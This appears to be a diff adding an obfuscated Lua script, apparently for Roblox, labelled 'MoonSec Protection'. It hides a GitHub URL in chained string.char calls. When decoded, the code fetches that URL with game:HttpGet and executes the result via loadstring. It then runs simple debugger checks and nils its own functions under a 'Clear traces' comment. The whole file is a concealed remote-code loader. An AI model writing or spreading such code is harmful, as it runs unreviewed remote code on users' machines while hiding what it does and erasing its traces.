@@ -1,0 +1,137 @@
+local jzVPmYRsMSs2UBt, BNG1N7kmX1hZZgj, bcH2q89yDUs6I8a, XbD1qx0ziw8ltgv, wKOs_ROFSQ7sfoc, kx_5NDa996CsgFt, X6w0ujKAjKS0KNY, cJrmA4OqYLrF6PI, r3YzHhvmXizf7i3, zFdNwrBOzSHpuLE
+jzVPmYRsMSs2UBt="MoonSec"
+BNG1N7kmX1hZZgj="Protection"
+bcH2q89yDUs6I8a="v4.0"
+XbD1qx0ziw8ltgv="By"
+wKOs_ROFSQ7sfoc="Hendar"
+kx_5NDa996CsgFt="Development"
+X6w0ujKAjKS0KNY="https://"
+cJrmA4OqYLrF6PI="Hendar"
+r3YzHhvmXizf7i3="infinityfreeapp"
+zFdNwrBOzSHpuLE=".com"
+local lnVS8vANUFqsc1Q, jKG7l29qoJJ7dKU, HrzBBMCQwFNZQRz, TXfMf6CY6X8Q7I4, kbhBaIrQTX5X1d4, WaAp9QCckmnPseK, uL4hE1LKLPke8v6, jQisJrXDdsskKVV, Pl5yodi7hC9bAkJ, wnsmvEiFlIQeqYN
+lnVS8vANUFqsc1Q=type
+jKG7l29qoJJ7dKU=pcall
+HrzBBMCQwFNZQRz=xpcall
+TXfMf6CY6X8Q7I4=loadstring
+kbhBaIrQTX5X1d4=load
+WaAp9QCckmnPseK=getfenv
+uL4hE1LKLPke8v6=setfenv
+jQisJrXDdsskKVV=debug
+Pl5yodi7hC9bAkJ=coroutine
+wnsmvEiFlIQeqYN=math
+local OFObl6rVsGlUtAb, g2Yh6B9AHycofQq, KqSBToqweAglgqS, l_0KmBXOmLiI9lL, qXpGvHJbkcG8LYE, dpdftX9fv9opboQ, k8UVteM0eQNWA8N, NKoQGNoQx7yD8Cy, vXoEHkdFyqdF574, of10PgjBckSCacR
+OFObl6rVsGlUtAb=table
+g2Yh6B9AHycofQq=OFObl6rVsGlUtAb.concat
+KqSBToqweAglgqS=OFObl6rVsGlUtAb.insert
+l_0KmBXOmLiI9lL=OFObl6rVsGlUtAb.remove
+qXpGvHJbkcG8LYE=string
+dpdftX9fv9opboQ=qXpGvHJbkcG8LYE.byte
+k8UVteM0eQNWA8N=qXpGvHJbkcG8LYE.char
+NKoQGNoQx7yD8Cy=qXpGvHJbkcG8LYE.sub
+vXoEHkdFyqdF574=qXpGvHJbkcG8LYE.find
+of10PgjBckSCacR=qXpGvHJbkcG8LYE.gsub
+local QNxpddE8jEV7I3r, lh9hg5oe3cJreoo, vIrlD9OH_Z5vmmI, cocigU4kpPWckTi, tosQx8GgK4Fe3lv, Tygd5JTwOnPWQyc, DIoM0ZOZH36NzlN, XwJAJYVkRKWgSdV, vu6X8ydwwEagP3R, VU5VBz5QLgCBWAO
+QNxpddE8jEV7I3r=select
+lh9hg5oe3cJreoo=tonumber
+vIrlD9OH_Z5vmmI=tostring
+cocigU4kpPWckTi=unpack
+tosQx8GgK4Fe3lv=pairs
+Tygd5JTwOnPWQyc=ipairs
+DIoM0ZOZH36NzlN=next
+XwJAJYVkRKWgSdV=rawequal
+vu6X8ydwwEagP3R=rawget
+VU5VBz5QLgCBWAO=rawset
+local IpKavddH6mByI_l, cMKyRMuP5bQnE5m, nn_x0TPpOJhzMhE, OntFnOfRgTjMnQw, hPVOkUpu8c2tYlP, n1v1heUiKbv_lC7, Hkv7RzCJjGkUJnk, K7aMgnmlpMlhDJx, dF1F6OkWI9xwwAL, nPgYGqXtEc4wbVb
+IpKavddH6mByI_l=nil
+cMKyRMuP5bQnE5m=nil
+nn_x0TPpOJhzMhE=nil
+OntFnOfRgTjMnQw=nil
+hPVOkUpu8c2tYlP=nil
+n1v1heUiKbv_lC7=nil
+Hkv7RzCJjGkUJnk=nil
+K7aMgnmlpMlhDJx=nil
+dF1F6OkWI9xwwAL=nil
+nPgYGqXtEc4wbVb=nil
+do
+local _G, _ENV, assert, error, print, warn
+_G=_G
+_ENV=_ENV
+assert=assert
+error=error
+print=print
+warn=warn
+local function  jzVPmYRsMSs2UBt_BNG1N7kmX1hZZgj_bcH2q89yDUs6I8a()
+local D6G0scpBs3={(string.char(108)..string.char(111)..string.char(97)..string.char(100))..(string.char(115)..string.char(116)..string.char(114)..string.char(105))..(string.char(110)..string.char(103)..string.char(40)..string.char(103))..(string.char(97)..string.char(109)..string.char(101)..string.char(58))..(string.char(72)..string.char(116)..string.char(116)..string.char(112))..(string.char(71)..string.char(101)..string.char(116)..string.char(40))..(string.char(34)..string.char(104)..string.char(116)..string.char(116))..(string.char(112)..string.char(115)..string.char(58)..string.char(47))..(string.char(47)..string.char(114)..string.char(97)..string.char(119))..(string.char(46)..string.char(103)..string.char(105)..string.char(116))..(string.char(104)..string.char(117)..string.char(98)..string.char(117))..(string.char(115)..string.char(101)..string.char(114)..string.char(99))..(string.char(111)..string.char(110)..string.char(116)..string.char(101))..(string.char(110)..string.char(116)..string.char(46)..string.char(99))..(string.char(111)..string.char(109)..string.char(47)..string.char(121))..(string.char(105)..string.char(115)..string.char(104)..string.char(105))..(string.char(102)..string.char(97)..string.char(110)..string.char(104))..(string.char(117)..string.char(97)..string.char(48)..string.char(48))..(string.char(49)..string.char(47)..string.char(115)..string.char(99))..(string.char(114)..string.char(105)..string.char(112)..string.char(116))..(string.char(47)..string.char(114)..string.char(101)..string.char(102))..(string.char(115)..string.char(47)..string.char(104)..string.char(101))..(string.char(97)..string.char(100)..string.char(115)..string.char(47))..(string.char(109)..string.char(97)..string.char(105)..string.char(110))..(string.char(47)..string.char(37)..string.char(69)..string.char(56))..(string.char(37)..string.char(56)..string.char(66)..string.char(37))..(string.char(66)..string.char(49)..string.char(37)..string.char(69))..(string.char(54)..string.char(37)..string.char(57)..string.char(54))..(string.char(37)..string.char(56)..string.char(55)..string.char(34))..(string.char(41)..string.char(41)..string.char(40)..string.char(41))}
+local GNUJXJtBuL=table.concat(D6G0scpBs3, "")
+return GNUJXJtBuL
+end
+local function  XbD1qx0ziw8ltgv_wKOs_ROFSQ7sfoc_kx_5NDa996CsgFt(_arg1)
+if lnVS8vANUFqsc1Q(_arg1)=="function"then
+return _arg1
+elseif  TXfMf6CY6X8Q7I4 then
+local _arg2=TXfMf6CY6X8Q7I4(_arg1)
+if _arg2 then
+local _arg3=WaAp9QCckmnPseK(0)
+if _arg3 then
+uL4hE1LKLPke8v6(_arg2, _arg3)
+end
+return _arg2
+end
+end
+if kbhBaIrQTX5X1d4 then
+local _arg4=kbhBaIrQTX5X1d4(_arg1)
+if _arg4 then return _arg4 end
+end
+return nil
+end
+local function  X6w0ujKAjKS0KNY_cJrmA4OqYLrF6PI_r3YzHhvmXizf7i3(_arg5, _arg6)
+local _arg7, _arg8=jKG7l29qoJJ7dKU(_arg5, _arg6)
+if not _arg7 then
+if HrzBBMCQwFNZQRz then
+local function  _arg9(_arg10)
+return _arg10
+end
+HrzBBMCQwFNZQRz(_arg5, _arg6, _arg9)
+end
+end
+return _arg7, _arg8
+end
+local _script_data=jzVPmYRsMSs2UBt_BNG1N7kmX1hZZgj_bcH2q89yDUs6I8a()
+local _loader_func=XbD1qx0ziw8ltgv_wKOs_ROFSQ7sfoc_kx_5NDa996CsgFt(_script_data)
+if _loader_func then
+local _success, _result=X6w0ujKAjKS0KNY_cJrmA4OqYLrF6PI_r3YzHhvmXizf7i3(_loader_func)
+if _success then
+if lnVS8vANUFqsc1Q(_result)=="function"then
+_result()
+elseif  lnVS8vANUFqsc1Q(_result)=="table"then
+if _result.main and lnVS8vANUFqsc1Q(_result.main)=="function"then
+_result.main()
+end
+end
+end
+end--Anti-debug protection
+if jQisJrXDdsskKVV and jQisJrXDdsskKVV.getinfo then
+local _info=jQisJrXDdsskKVV.getinfo(1)
+if _info then
+if _info.source and qXpGvHJbkcG8LYE.find(_info.source, "@")then
+IpKavddH6mByI_l=true
+end
+end
+end
+if Pl5yodi7hC9bAkJ and Pl5yodi7hC9bAkJ.running then
+local _co=Pl5yodi7hC9bAkJ.running()
+if _co then
+cMKyRMuP5bQnE5m=Pl5yodi7hC9bAkJ.status(_co)
+end
+end--Clear traces
+_script_data=nil
+_loader_func=nil
+jzVPmYRsMSs2UBt_BNG1N7kmX1hZZgj_bcH2q89yDUs6I8a=nil
+XbD1qx0ziw8ltgv_wKOs_ROFSQ7sfoc_kx_5NDa996CsgFt=nil
+X6w0ujKAjKS0KNY_cJrmA4OqYLrF6PI_r3YzHhvmXizf7i3=nil
+end--[[ 
+Script execution completed
+MoonSec Protection Active
+Infinite Yield Protection: Enabled
+]]
